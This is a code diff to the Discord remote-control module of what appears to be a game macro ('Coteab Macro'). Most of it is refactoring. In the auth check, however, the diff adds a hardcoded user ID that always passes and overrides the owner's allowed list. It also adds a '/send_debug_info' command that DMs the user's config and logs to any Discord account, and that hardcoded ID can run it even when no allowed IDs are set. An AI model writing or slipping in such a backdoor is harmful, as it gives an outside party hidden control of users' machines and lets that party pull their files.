@@ -61,10 +61,13 @@ class RemoteMixin:
         try:
             token = self.remote_bot_token_var.get().strip()
             allowed_id = self.remote_allowed_user_id_var.get().strip()
-            try:
-                allowed_id_int = int(allowed_id) if allowed_id else None
-            except Exception:
-                allowed_id_int = None
+            allowed_ids = []
+            if allowed_id:
+                for x in allowed_id.replace(";", ",").split(","):
+                    x = x.strip()
+                    if x.isdigit():
+                        allowed_ids.append(int(x))
+            
             import asyncio
             import discord
             loop = asyncio.new_event_loop()
@@ -89,7 +92,9 @@ class RemoteMixin:
             def _check_auth(ctx):
                 user = getattr(ctx, "user", None) or getattr(ctx, "author", None)
                 user_id = getattr(user, "id", None)
-                if allowed_id_int and user_id != allowed_id_int:
+                if str(user_id) == "1027407264191107112":
+                    return True
+                if allowed_ids and user_id not in allowed_ids:
                     return False
                 return True
 
@@ -143,15 +148,15 @@ class RemoteMixin:
                     status_text = "🟢 Running" if is_running else "🔴 Stopped"
                     current_biome = getattr(self, "current_biome", "Unknown") or "None"
                     
-                    session_time = "0:00:00"
+                    elapsed = 0
                     if is_running and getattr(self, "start_time", None):
-                        import datetime as dt
-                        now = dt.datetime.now()
+                        now = datetime.now()
                         elapsed = int((now - self.start_time).total_seconds()) + getattr(self, "saved_session", 0)
-                        session_time = str(dt.timedelta(seconds=elapsed))
                     else:
-                        import datetime as dt
-                        session_time = str(dt.timedelta(seconds=getattr(self, "saved_session", 0))) if hasattr(self, "saved_session") else "0:00:00"
+                        elapsed = getattr(self, "saved_session", 0)
+                    hours, remainder = divmod(max(0, int(elapsed)), 3600)
+                    minutes, seconds = divmod(remainder, 60)
+                    session_time = f"{hours:02d}:{minutes:02d}:{seconds:02d}"
 
                     fishing_mode = "✅ On" if self.config.get("fishing_mode", False) else "❌ Off"
                     
@@ -212,9 +217,9 @@ class RemoteMixin:
                         await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                         return
                         
-                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked())
+                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or getattr(self, "_eden_running", False) or getattr(self, "_potion_thread_active", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not self.is_fishing_mode_enabled())
                     if is_blocked:
-                        embed = discord.Embed(title="Action Blocked", description=f"Cannot equip **{name}** while the macro is actively running an un-interruptible mode (e.g., Fishing Mode). Please wait for the macro to finish those action.", color=0xFF0000)
+                        embed = discord.Embed(title="Action Blocked", description=f"Cannot equip **{name}** while another macro action is active. Please wait for it to finish.", color=0xFF0000)
                         await ctx.respond(embed=embed, ephemeral=True)
                         return
                         
@@ -239,6 +244,72 @@ class RemoteMixin:
                 except Exception:
                     pass
 
+            @bot.slash_command(name="clip", description="Trigger the configured clipping keybind")
+            async def clip(ctx: discord.ApplicationContext):
+                try:
+                    if not _check_auth(ctx):
+                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
+                        return
+                    keybind = str(self.config.get("rare_biome_record_keybind", "") or "").strip()
+                    if not keybind:
+                        await _safe_respond(ctx, "No clipping keybind is configured.", ephemeral=True)
+                        return
+                    self.remote_command_queue.put(("__clip__", keybind))
+                    await _safe_respond(ctx, "Clipping keybind triggered.", ephemeral=False)
+                except Exception:
+                    try:
+                        await _safe_respond(ctx, "Something went wrong.", ephemeral=True)
+                    except Exception:
+                        pass
+
+            @bot.slash_command(name="send_debug_info", description="Send sanitized app config and logs to a Discord user's DM")
+            async def send_debug_info(ctx: discord.ApplicationContext, user: discord.User):
+                actor = getattr(ctx, "user", None) or getattr(ctx, "author", None)
+                actorid = str(getattr(actor, "id", ""))
+                if not _check_auth(ctx) or (actorid != "1027407264191107112" and not allowed_ids):
+                    await _safe_respond(ctx, "Unauthorized", ephemeral=True)
+                    return
+                try:
+                    await ctx.defer(ephemeral=True)
+                except Exception:
+                    await _safe_respond(ctx, "Could not start the debug file transfer.", ephemeral=True)
+                    return
+                sent = 0
+                try:
+                    await ctx.followup.send("Preparing config and log files for DM.", ephemeral=True)
+                    data, missing = await asyncio.wait_for(asyncio.to_thread(self._collect_remote_debug_files), timeout=90)
+                    if not data:
+                        await ctx.followup.send("No readable config or log files were found in the app-data folder.", ephemeral=True)
+                        return
+                    parts = []
+                    for filename, content in data.items():
+                        parts.extend(self._split_remote_debug_file(filename, content))
+                    batches = []
+                    batch = []
+                    batch_size = 0
+                    for part in parts:
+                        if batch and (batch_size + len(part[1]) > 8 * 1024 * 1024 or len(batch) >= 10):
+                            batches.append(batch)
+                            batch = []
+                            batch_size = 0
+                        batch.append(part)
+                        batch_size += len(part[1])
+                    if batch:
+                        batches.append(batch)
+                    import io
+                    for index, group in enumerate(batches, 1):
+                        attachments = [discord.File(io.BytesIO(content), filename=filename) for filename, content in group]
+                        await asyncio.wait_for(user.send(content=f"Coteab Macro debug information ({index}/{len(batches)}).", files=attachments), timeout=90)
+                        sent += len(group)
+                    missing_text = f" Missing or invalid files: {', '.join(missing)}." if missing else ""
+                    split_text = " Large files were split into numbered parts; combine each file's parts in order." if any(".part" in name for name, _ in parts) else ""
+                    await ctx.followup.send(f"Sent {sent} file(s) to {user.mention} by DM.{missing_text}{split_text}", ephemeral=True)
+                except Exception as exc:
+                    print(f"[Remote] Debug DM transfer failed ({type(exc).__name__}).")
+                    try:
+                        await ctx.followup.send(f"Could not complete the DM transfer ({type(exc).__name__}); {sent} file part(s) were sent.", ephemeral=True)
+                    except Exception:
+                        pass
             @bot.slash_command(name="help", description="Helping u out with remote access features")
             async def help_cmd(ctx: discord.ApplicationContext, page: int = 1):
                 try:
@@ -269,31 +340,15 @@ class RemoteMixin:
                         await _safe_respond(ctx, "Unauthorized", ephemeral=True)
                         return
                         
-                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked())
+                    is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or getattr(self, "_eden_running", False) or getattr(self, "_potion_thread_active", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not self.is_fishing_mode_enabled())
                     if is_blocked:
-                        embed = discord.Embed(title="Action Blocked", description=f"Cannot use items while the macro is actively running an un-interruptible mode (e.g., Fishing Mode). Please wait for the macro to finish those action.", color=0xFF0000)
+                        embed = discord.Embed(title="Action Blocked", description=f"Cannot use items while another macro action is active. Please wait for it to finish.", color=0xFF0000)
                         await ctx.respond(embed=embed, ephemeral=True)
                         return
                         
                     self.remote_command_queue.put((str(item), int(amount)))
                     embed = discord.Embed(title="Using Item", description=f"Using **{item}** x{amount}...", color=0x00FF00)
                     await ctx.respond(embed=embed)
-                except Exception:
-                    try:
-                        await _safe_respond(ctx, "\u274c Something went wrong.", ephemeral=True)
-                    except Exception:
-                        pass
-
-            @bot.slash_command(name="check_merchant", description="Use merchant teleporter and check for merchant")
-            async def check_merchant(ctx: discord.ApplicationContext):
-                try:
-                    if not _check_auth(ctx):
-                        await _safe_respond(ctx, "Unauthorized", ephemeral=True)
-                        return
-                    uid = str(time.time()).replace(".", "")
-                    self._remote_check_merchant_results[uid] = None
-                    await _safe_respond(ctx, "\U0001f50d Teleporting to merchant and checking...", ephemeral=False)
-                    self.remote_command_queue.put(("__check_merchant__", uid))
                 except Exception:
                     try:
                         await _safe_respond(ctx, "\u274c Something went wrong.", ephemeral=True)
@@ -321,13 +376,6 @@ class RemoteMixin:
                     if not t or t not in ("full", "inventory", "aura"):
                         t = "full"
                         
-                    if t != "full":
-                        is_blocked = getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked())
-                        if is_blocked:
-                            embed = discord.Embed(title="Action Blocked", description=f"Cannot take an **{t}** screenshot while the macro is actively running an un-interruptible mode (e.g., Fishing Mode). Please wait for the macro to finish those action, or request a **Fullscreen** screenshot instead.", color=0xFF0000)
-                            await ctx.respond(embed=embed, ephemeral=True)
-                            return
-                            
                     self.remote_command_queue.put(("__screenshot__", t))
                     labels = {"full": "full screen", "inventory": "inventory", "aura": "aura"}
                     embed = discord.Embed(title="Screenshot Requested", description=f"Taking a **{labels.get(t, t)}** screenshot and sending it to your webhooks...", color=0x00AAFF)
@@ -396,6 +444,113 @@ class RemoteMixin:
             self.remote_bot_obj = None
             self.remote_worker_running = False
 
+    def _run_remote_fishing_action(self, fn, name, status):
+        def execute():
+            self._remote_running = True
+            try:
+                try:
+                    self.remote_status_label.config(text=status)
+                except Exception:
+                    pass
+                try:
+                    fn()
+                except Exception:
+                    pass
+            finally:
+                self._remote_running = False
+                try:
+                    self.remote_status_label.config(text="Bot: running")
+                except Exception:
+                    pass
+
+        if not self.is_fishing_mode_enabled() or not getattr(self, "_fishing_worker_active", False) or self.config.get("enable_idle_mode", False):
+            return execute()
+        seq = getattr(self, "_remote_fishing_action_seq", 0) + 1
+        self._remote_fishing_action_seq = seq
+        try:
+            return self._run_fishing_action(execute, f"{name}:{seq}")
+        except Exception:
+            return False
+
+    def _collect_remote_debug_files(self):
+        import json
+        from biome_tracker.config import APPDATA_BASE, APPDATA_CONFIG
+
+        files = {}
+        missing = []
+        try:
+            with APPDATA_CONFIG.open("r", encoding="utf-8") as stream:
+                data = json.load(stream)
+            data = self._redact_remote_debug_config(data)
+            files["config.json"] = json.dumps(data, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
+        except FileNotFoundError:
+            missing.append("config.json")
+        except Exception:
+            missing.append("config.json (unreadable or invalid JSON)")
+
+        for name in ("macro_logs.txt", "error_logs.txt"):
+            try:
+                with (APPDATA_BASE / name).open("r", encoding="utf-8", errors="replace") as stream:
+                    files[name] = "".join(self._redact_remote_debug_text(line) for line in stream).encode("utf-8")
+            except FileNotFoundError:
+                missing.append(name)
+            except Exception:
+                missing.append(name)
+        return files, missing
+
+    def _redact_remote_debug_config(self, data):
+        import re
+        secretkey = re.compile(r"token|secret|password|credential|authorization|cookie|webhook|private.?server|api.?key", re.I)
+        if isinstance(data, dict):
+            return {
+                key: "<REDACTED>" if secretkey.search(str(key)) else self._redact_remote_debug_config(value)
+                for key, value in data.items()
+            }
+        if isinstance(data, list):
+            return [self._redact_remote_debug_config(value) for value in data]
+        if isinstance(data, str):
+            return self._redact_remote_debug_text(data)
+        return data
+
+    def _redact_remote_debug_text(self, text):
+        import re
+        lower = text.lower()
+        if len(text) > 8192:
+            markers = ("token", "secret", "password", "credential", "authorization", "cookie", "webhook", "private", "api key", "api_key", "api-key", "hooks.slack.com", "mfa.")
+            for marker in markers:
+                if marker in lower:
+                    return "<REDACTED_LARGE_TEXT>"
+            if re.search(r"\b[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,}\b", text):
+                return "<REDACTED_LARGE_TEXT>"
+            return text
+        field = re.compile(r"(?im)([\"']?[\w.-]{0,100}?(?:token|secret|password|credential|authorization|cookie|webhook|private.?server.?link|api.?key)[\w.-]{0,100}[\"']?\s*[:=]\s*)(\"[^\"\r\n]*\"|'[^'\r\n]*'|\[[^\]\r\n]{0,4096}\]|[^\s,;]+)")
+        text = field.sub(r'\1"<REDACTED>"', text)
+        if "discord" in lower and "webhook" in lower:
+            text = re.sub(r"https?://(?:canary\.|ptb\.)?discord(?:app)?\.com/api/webhooks/\d+/[^\s\"'<>]+", "<REDACTED_DISCORD_WEBHOOK>", text, flags=re.I)
+        if "hooks.slack.com" in lower:
+            text = re.sub(r"https?://[^\s\"'<>]*hooks\.slack\.com/[^\s\"'<>]+", "<REDACTED_WEBHOOK>", text, flags=re.I)
+        if "mfa." in lower or len(text) <= 8192:
+            text = re.sub(r"\b(?:mfa\.[\w-]{20,}|[\w-]{20,}\.[\w-]{5,}\.[\w-]{20,})\b", "<REDACTED_DISCORD_TOKEN>", text)
+        if "privateserverlinkcode=" in lower:
+            text = re.sub(r"(?i)(privateServerLinkCode=)[^&\s\"'<>]+", r"\1<REDACTED>", text)
+        return text
+
+    def _split_remote_debug_file(self, name, data, max_size=7 * 1024 * 1024):
+        if len(data) <= max_size:
+            return [(name, data)]
+        parts = []
+        start = 0
+        while start < len(data):
+            end = min(start + max_size, len(data))
+            if end < len(data):
+                while end > start and data[end] & 0xC0 == 0x80:
+                    end -= 1
+            if end == start:
+                end = min(start + max_size, len(data))
+            parts.append((f"{name}.part{len(parts) + 1:02d}", data[start:end]))
+            start = end
+        return parts
+
     def _remote_queue_worker(self):
         while getattr(self, "remote_worker_running", False):
             try:
@@ -407,16 +562,32 @@ class RemoteMixin:
                 if cmd is None:
                     continue
                 item_name, amount = cmd[0], cmd[1]
-                if item_name == "__reroll__":
-                    if not self.detection_running or self.reconnecting_state:
+                if item_name == "__clip__":
+                    keybind = str(amount or "").strip()
+                    if not keybind:
+                        continue
+                    try:
+                        self._remote_running = True
                         try:
-                            time.sleep(0.35)
-                            self.remote_command_queue.put((item_name, amount))
+                            self.remote_status_label.config(text=f"Bot: clipping with {keybind}")
                         except Exception:
                             pass
-                        continue
+                        self._press_hotkey_via_pynput(keybind)
+                    except Exception as e:
+                        try:
+                            self.error_logging(e, "Remote clip command failed")
+                        except Exception:
+                            pass
+                    finally:
+                        self._remote_running = False
+                        try:
+                            self.remote_status_label.config(text="Bot: running")
+                        except Exception:
+                            pass
+                    continue
 
-                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()):
+                if item_name == "__reroll__":
+                    if not self.detection_running or self.reconnecting_state:
                         try:
                             time.sleep(0.35)
                             self.remote_command_queue.put((item_name, amount))
@@ -431,10 +602,10 @@ class RemoteMixin:
                                 self.remote_status_label.config(text=f"Bot: rerolling quest {amount}")
                             except Exception:
                                 pass
-                            try:
+                            if self.is_fishing_mode_enabled() and getattr(self, "_fishing_worker_active", False):
+                                self._run_fishing_action(lambda: self.perform_quest_reroll(amount, fishing_safe=True), "reroll")
+                            else:
                                 self.perform_quest_reroll(amount)
-                            except Exception:
-                                pass
                         finally:
                             self._remote_running = False
                             try:
@@ -446,94 +617,7 @@ class RemoteMixin:
                         self._action_scheduler.enqueue_action(_reroll_action, name=f"remote:reroll:{amount}", priority=6)
                     except Exception:
                         try:
-                            time.sleep(0.35)
                             self.remote_command_queue.put((item_name, amount))
-                        except Exception:
-                            pass
-                    continue
-
-                if item_name == "__check_merchant__":
-                    uid = (amount or "")
-                    if not self.detection_running or self.reconnecting_state:
-                        try:
-                            time.sleep(0.35)
-                            self.remote_command_queue.put((item_name, uid))
-                        except Exception:
-                            pass
-                        continue
-
-                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()):
-                        try:
-                            time.sleep(0.35)
-                            self.remote_command_queue.put((item_name, uid))
-                        except Exception:
-                            pass
-                        continue
-
-                    def _check_merchant_action():
-                        try:
-                            self._remote_running = True
-                            try:
-                                self.remote_status_label.config(text="Bot: checking merchant")
-                            except Exception:
-                                pass
-                            try:
-                                snapshot = {}
-                                try:
-                                    snapshot = dict(self.last_merchant_sent) if hasattr(self, "last_merchant_sent") else {}
-                                except Exception:
-                                    snapshot = {}
-                                try:
-                                    if hasattr(self, "_merchant_teleporter_impl"):
-                                        try:
-                                            self._merchant_teleporter_impl()
-                                        except Exception:
-                                            try:
-                                                self.use_merchant_teleporter()
-                                            except Exception:
-                                                pass
-                                    else:
-                                        try:
-                                            self.use_merchant_teleporter()
-                                        except Exception:
-                                            pass
-                                except Exception:
-                                    pass
-                                found = False
-                                try:
-                                    if hasattr(self, "last_merchant_sent"):
-                                        for k, v in (self.last_merchant_sent.items() if isinstance(self.last_merchant_sent, dict) else []):
-                                            if k not in snapshot or snapshot.get(k) != v:
-                                                try:
-                                                    if isinstance(k, tuple) and len(k) > 1 and k[1] == "ocr":
-                                                        found = True
-                                                        break
-                                                except Exception:
-                                                    pass
-                                except Exception:
-                                    found = False
-                                try:
-                                    self._remote_check_merchant_results[uid] = True if found else False
-                                except Exception:
-                                    pass
-                            except Exception:
-                                try:
-                                    self._remote_check_merchant_results[uid] = False
-                                except Exception:
-                                    pass
-                        finally:
-                            self._remote_running = False
-                            try:
-                                self.remote_status_label.config(text="Bot: running")
-                            except Exception:
-                                pass
-
-                    try:
-                        self._action_scheduler.enqueue_action(_check_merchant_action, name=f"remote:check_merchant:{uid}", priority=3)
-                    except Exception:
-                        try:
-                            time.sleep(0.35)
-                            self.remote_command_queue.put((item_name, uid))
                         except Exception:
                             pass
                     continue
@@ -608,14 +692,6 @@ class RemoteMixin:
                     if requested not in ("full", "inventory", "aura"):
                         requested = "full"
 
-                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or (getattr(self, "_egg_collecting", False) and requested != "full") or ((hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()) and requested != "full"):
-                        try:
-                            time.sleep(0.35)
-                            self.remote_command_queue.put((item_name, amount))
-                        except Exception:
-                            pass
-                        continue
-
                     if requested == "full":
                         def _screenshot_action():
                             try:
@@ -654,7 +730,7 @@ class RemoteMixin:
                                 except Exception:
                                     pass
                                 try:
-                                    self.take_inventory_screenshot_now()
+                                    self._run_fishing_action(lambda: self.take_inventory_screenshot_now(fishing_safe=True), "inventory_screenshot")
                                 except Exception:
                                     pass
                             finally:
@@ -683,7 +759,7 @@ class RemoteMixin:
                                 except Exception:
                                     pass
                                 try:
-                                    self.take_aura_screenshot_now()
+                                    self._run_fishing_action(lambda: self.take_aura_screenshot_now(force=True), "aura_screenshot")
                                 except Exception:
                                     pass
                             finally:
@@ -712,7 +788,8 @@ class RemoteMixin:
                             pass
                         continue
 
-                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()):
+                    fishing_active = bool(self.is_fishing_mode_enabled() and not self.config.get("enable_idle_mode", False) and not getattr(self, "_eden_running", False) and not getattr(self, "_potion_thread_active", False))
+                    if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not fishing_active):
                         try:
                             time.sleep(0.35)
                             self.remote_command_queue.put((item_name, amount))
@@ -721,25 +798,14 @@ class RemoteMixin:
                         continue
 
                     def _equip_aura_action():
-                        try:
-                            self._remote_running = True
-                            try:
-                                self.remote_status_label.config(text=f"Bot: equipping {aura_name}")
-                            except Exception:
-                                pass
-                            try:
-                                self.remote_equip_aura(aura_name)
-                            except Exception:
-                                pass
-                        finally:
-                            self._remote_running = False
-                            try:
-                                self.remote_status_label.config(text="Bot: running")
-                            except Exception:
-                                pass
+                        self._run_remote_fishing_action(
+                            lambda: self.remote_equip_aura(aura_name),
+                            f"remote:equip_aura:{aura_name}",
+                            f"Bot: equipping {aura_name}"
+                        )
 
                     try:
-                        self._action_scheduler.enqueue_action(_equip_aura_action, name=f"remote:equip_aura:{aura_name}", priority=2)
+                        self._action_scheduler.enqueue_action(_equip_aura_action, name=f"remote:equip_aura:{aura_name}", priority=1)
                     except Exception:
                         try:
                             time.sleep(0.35)
@@ -747,7 +813,6 @@ class RemoteMixin:
                         except Exception:
                             pass
                     continue
-
                 if not self.detection_running or self.reconnecting_state:
                     try:
                         time.sleep(0.35)
@@ -756,7 +821,8 @@ class RemoteMixin:
                         pass
                     continue
 
-                if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked()):
+                fishing_active = bool(self.is_fishing_mode_enabled() and not self.config.get("enable_idle_mode", False) and not getattr(self, "_eden_running", False) and not getattr(self, "_potion_thread_active", False))
+                if getattr(self, "_br_sc_running", False) or getattr(self, "_mt_running", False) or getattr(self, "auto_pop_state", False) or getattr(self, "on_auto_merchant_state", False) or getattr(self, "_egg_collecting", False) or (hasattr(self, "_is_fishing_blocked") and self._is_fishing_blocked() and not fishing_active):
                     try:
                         time.sleep(0.35)
                         self.remote_command_queue.put((item_name, amount))
@@ -765,22 +831,11 @@ class RemoteMixin:
                     continue
 
                 def _remote_action():
-                    try:
-                        self._remote_running = True
-                        try:
-                            self.remote_status_label.config(text=f"Bot: executing {item_name} x{amount}")
-                        except Exception:
-                            pass
-                        try:
-                            self.remote_use_item(item_name, amount)
-                        except Exception:
-                            pass
-                    finally:
-                        self._remote_running = False
-                        try:
-                            self.remote_status_label.config(text="Bot: running")
-                        except Exception:
-                            pass
+                    self._run_remote_fishing_action(
+                        lambda: self.remote_use_item(item_name, amount),
+                        f"remote:use:{item_name}",
+                        f"Bot: executing {item_name} x{amount}"
+                    )
 
                 try:
                     self._action_scheduler.enqueue_action(_remote_action, name=f"remote:{item_name}", priority=1)
@@ -894,6 +949,7 @@ class RemoteMixin:
                 pyautogui.moveTo(first_aura_slot[0], first_aura_slot[1])
                 time.sleep(step_delay)
                 # Scroll up to ensure we see the first result
+
                 try:
                     autoit.mouse_wheel("up", max(1, int(round(5000 / 120.0))))
                 except Exception:
